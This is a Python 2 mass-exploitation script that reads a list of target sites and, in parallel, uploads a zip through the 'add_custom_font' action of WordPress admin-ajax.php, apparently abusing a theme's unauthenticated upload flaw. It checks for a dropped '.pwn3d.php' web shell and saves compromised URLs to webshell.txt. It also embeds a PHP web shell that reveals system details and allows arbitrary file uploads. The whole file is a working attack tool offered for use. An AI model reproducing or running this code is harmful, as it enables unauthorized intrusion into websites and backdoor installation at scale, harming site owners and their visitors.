import sys , requests, re , string , random
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
init(autoreset=True)

fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA

print """{}  
/ ___|  ___  ___ | __ )  __ _ _ __| __ )  __ _ _ __
\___ \ / _ \/ _ \|  _ \ / _` | '__|  _ \ / _` | '__|
 ___) |  __/ (_) | |_) | (_| | |  | |_) | (_| | |
|____/ \___|\___/|____/ \__,_|_|  |____/ \__,_|_|1337
""".format(fg)

shell = """<?php echo "aDriv4"; echo "<br>".php_uname()."<br>"; echo "<form method='post' enctype='multipart/form-data'> <input type='file' name='zb'><input type='submit' name='upload' value='upload'></form>"; if($_POST['upload']) { if(@copy($_FILES['zb']['tmp_name'], $_FILES['zb']['name'])) { echo "Uploading Succefully"; } else { echo "Failed to Upload."; } } ?>"""
script ='<?php echo "hello" ?>'
requests.urllib3.disable_warnings()
headers = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}
try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')
def content_req(req):
    if (sys.version_info[0] < 3):
        try:
            try:
                return str(req.content)
            except:
                try:
                    return str(req.content.encode('utf-8'))
                except:
                    return str(req.content.decode('utf-8'))
        except:
            return str(req.text)
    else:
        try:
            try:
                return str(req.content.decode('utf-8'))
            except:
                try:
                    return str(req.content.encode('utf-8'))
                except:
                    return str(req.text)
        except:
            return str(req.content)
def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site
def ran(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))
def uploader(url,exploit_point):
    try:
        zipFileName = ran(8) 
        FileUpload = 'Files.zip'
        files = {"file": (zipFileName+ ".zip", open(FileUpload, 'rb'), 'multipart/form-data')}
        action = {"action": "add_custom_font"}
        inj0ct = requests.post(url = exploit_point, data = action, files = files, headers = headers, verify=False ,timeout=20)
        return url+"/wp-content/uploads/typehub/custom/"+zipFileName+"/.pwn3d.php"
    except Exception as e:
        return False
def Exploiter(url):
    try:
        dom = URLdomain(url)
        customURL = 'http://'+dom
        exploit_point = customURL+'/wp-admin/admin-ajax.php'
        ShellPath = uploader(customURL,exploit_point)
        shell_check = requests.get(ShellPath ,verify=False ,headers=headers ,timeout=20)
        shell_check = content_req(shell_check)
        if 'aDriv4' in shell_check and 'multipart/form-data' in shell_check:
            print ' -| ' + customURL + ' --> {}[Succefully]'.format(fg)
            open('webshell.txt', 'a').write(ShellPath +'\n')
        else:
            customURL = 'https://'+dom
            exploit_point = customURL+'/wp-admin/admin-ajax.php'
            ShellPath = uploader(customURL,exploit_point)
            shell_check = requests.get(ShellPath ,verify=False ,headers=headers ,timeout=20)
            shell_check = content_req(shell_check)
            if 'aDriv4' in shell_check and 'multipart/form-data' in shell_check:
                print ' -| ' + customURL + ' --> {}[Succefully]'.format(fg)
                open('webshell.txt', 'a').write(ShellPath +'\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
    except :
        print ' -| ' + url + ' --> {}[Failed]'.format(fr)

mp = Pool(20)
mp.map(Exploiter, target)
mp.close()
mp.join()

print '\n [!] {}Saved in webshell.txt'.format(fc)